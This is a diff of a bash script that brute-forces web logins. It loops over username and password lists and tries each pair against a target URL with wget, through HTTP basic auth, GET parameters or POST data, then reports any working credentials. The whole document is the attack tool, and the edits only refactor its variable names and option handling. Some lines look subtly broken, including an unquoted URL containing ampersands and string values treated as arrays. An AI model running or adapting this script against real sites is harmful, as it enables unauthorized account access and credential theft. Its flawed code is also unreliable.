@@ -8,10 +8,10 @@ usernames=
 passwords=
 delay=0
 post_or_get_args=
-type="ht"
+attack_type="http"
 protocol="http"
 
-if [ ! -z "$3" ]; then
+if [ -n "$3" ]; then
 	url="$1"
 	usernames="$2"
 	passwords="$3"
@@ -30,11 +30,11 @@ while getopts "c:d:p:g:" opt; do
 			;;
 		p)
 			post_or_get_args+="$OPTARG"
-			type=p
+			attack_type=post
 			;;
 		g)
 			post_or_get_args+="$OPTARG"
-			type=g
+			attack_type=get
 			;;
 		\?)
 			echo "Invalid option: -$OPTARG"
@@ -42,8 +42,10 @@ while getopts "c:d:p:g:" opt; do
 	esac
 done
 
-un=$post_or_get_args[0]
-pwd=$post_or_get_args[1]
+if [[ $attack_type == "post" || $attack_type == "get" ]]; then
+	post_or_get_username=$post_or_get_args[0]
+	post_or_get_password=$post_or_get_args[1]
+fi
 
 echo "starting Attack on $protocol://$url"
 
@@ -51,27 +53,27 @@ for username in $usernames
 do
 	for password in $passwords
 	do
-		case $type in
-			ht)
+		case $attack_type in
+			http)
 				if wget --spider $protocol://$username:$password@$url &>/dev/null; then
 					echo -e "\n\"$username\" : \"$password\" worked out\n"
 					exit
 				fi
 				;;
-			g)
-				if wget $protocol://$url?$un=$username&$pwd=$password &>/dev/null; then
+			get)
+				if wget $protocol://$url?$post_or_get_username=$username&$post_or_get_password=$password &>/dev/null; then
 					echo -e "\n\"$username\" : \"$password\" worked out\n"
 					exit
 				fi
 				;;
-			p)
-				if wget --post-data "$un=$username&$pwd=$password" $protocol://$url &>/dev/null; then
+			post)
+				if wget --post-data "$post_or_get_username=$username;$post_or_get_password=$password" $protocol://$url &>/dev/null; then
 					echo -e "\n\"$username\" : \"$password\" worked out\n"
 					exit
 				fi
 				;;
 			\?)
-				echo "invalid attack type"
+				echo "invalid attack type: $attack_type"
 				exit
 				;;
 		esac
